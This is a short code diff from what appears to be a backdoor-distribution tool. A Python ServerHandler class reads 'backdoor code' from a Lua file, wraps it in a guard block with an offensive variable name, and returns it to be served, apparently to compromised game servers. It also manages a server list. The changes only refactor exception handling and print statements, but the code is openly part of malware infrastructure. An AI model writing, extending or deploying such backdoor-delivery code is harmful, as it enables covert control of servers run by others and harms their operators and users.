@@ -15,8 +15,10 @@ class ServerHandler():
         try:
             backdoor_code = open('./includes/memes.lua', 'r').read()
             return "if not rape then\n"+backdoor_code+"\nend\n"
-        except:
-            print("Could not open main backdoor code! Please check your files.")
+        except Exception:
+            print(
+                "Could not open main backdoor code!",
+                "Please check your files.")
             return "nil"
 
     def get_current_server(self):
@@ -44,8 +46,9 @@ class ServerHandler():
                               line + ' to the list')
         except FileNotFoundError:
             print(
-                "Error opening server list file! File doesn't exist. Creating new file.")
+                "Error opening server list file! ",
+                "File doesn't exist. Creating new file.")
             file = open('server.list', 'w+')
             file.close()
-        except:
+        except Exception:
             print("Error opening server list file! nil by default")
